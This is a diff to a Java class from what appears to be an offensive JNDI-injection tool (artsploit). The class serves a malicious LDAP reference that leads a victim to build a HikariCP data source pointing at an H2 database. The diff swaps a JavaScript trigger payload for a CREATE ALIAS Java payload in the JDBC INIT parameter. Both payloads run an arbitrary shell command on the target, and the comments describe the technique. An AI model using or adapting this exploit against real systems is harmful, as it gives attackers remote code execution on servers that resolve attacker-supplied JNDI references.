@@ -16,10 +16,10 @@ import static artsploit.Utilities.serialize;
  * RCE by controlling the JDBC URL (connection string) of HikariJNDIFactory.
  * HikariJNDIFactory provides an implementation of javax.naming.ObjectFactory that can be used to instantiate a data source
  * and the connection string is controllable via the jdbcUrl attribute.
- * JDBC connection string for an H2 database provides an INIT parameter that can be used to execute an SQL statement.
- * The CREATE TRIGGER statement of the H2 db, supports Javascript code inside the trigger body. So by creating a JDBC
- * connection string to an H2 DB with the INIT parameter set to a CREATE TRIGGER statement containing JS code in the body
- * an RCE can be triggered.
+ * The JDBC connection string for an H2 database includes an INIT parameter, allowing the execution of an SQL statement.
+ * Utilizing the CREATE ALIAS command, one can establish a function that embeds a Java payload, which can then be invoked within an SQL query.
+ * Therefore, by configuring a JDBC connection string for an H2 database to include an INIT parameter that directs to an
+ * SQL statement featuring the CREATE ALIAS command followed by a CALL command, arbitrary Java code can be executed.
  *
  * Requires:
  *  HikariCP and H2 in classpath
@@ -42,10 +42,9 @@ public class HikariCPH2 implements LdapController {
         Entry e = new Entry(base);
         e.addAttribute("javaClassName", "java.lang.String"); //could be any
 
-        String javascript = "//javascript\njava.lang.Runtime.getRuntime().exec(['bash', '-c', '"+ Config.command + "'])";
-        String url = "jdbc:h2:mem:test;MODE=MSSQLServer;" +
-                "init=CREATE TRIGGER cmdExec BEFORE SELECT ON INFORMATION_SCHEMA.USERS AS $$" +
-                javascript + " $$";
+        String url = "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS EXEC AS " +
+                "'String shellexec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd)\\;" +
+                "return \"test\"\\;}'\\;CALL EXEC('" + Config.command + "')";
 
         Reference ref = new Reference("javax.sql.DataSource", "com.zaxxer.hikari.HikariJNDIFactory", null);
         ref.add(new StringRefAddr("driverClassName", "org.h2.Driver"));
